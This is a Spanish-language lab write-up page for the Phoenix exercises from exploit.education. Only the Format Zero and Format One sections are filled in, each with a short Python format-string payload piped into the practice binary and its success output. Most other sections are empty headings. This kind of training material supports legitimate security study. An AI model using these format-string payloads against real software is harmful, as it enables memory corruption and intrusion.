---
layout: default
title: "Phoenix-Exploit Education"
permalink: /Phoenix-EE/
---

# Phoenix-Exploit Education

## Stack Zero
## Stack One
## Stack Two
## Stack Three
## Stack Four
## Stack Five
## Stack Six

## Format Zero

Como hablamos de formatos, nos referimos a los que tienen **%** como por ejemplo **%s**, **%i**, **%p**, **%x** o **%d** entre otros. En este caso usaremos **%x**, unas cuantas veces para formar el  error del bug.

Ahora haremos lo siguiente:

```bash
$ python -c "print '%x'*20" | ./format-zero

Welcome to phoenix/format-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

## Format One

```bash
$ python -c "print '%32x\x6c\x4f\x76\x45'" | ./format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!

```

## Format Two



## Format Three
## Format Four
## Heap Zero
## Heap One
## Heap Two
## Heap Three
## Net Zero
## Net One
## Net Two
## Final Zero
## Final One
## Final Two

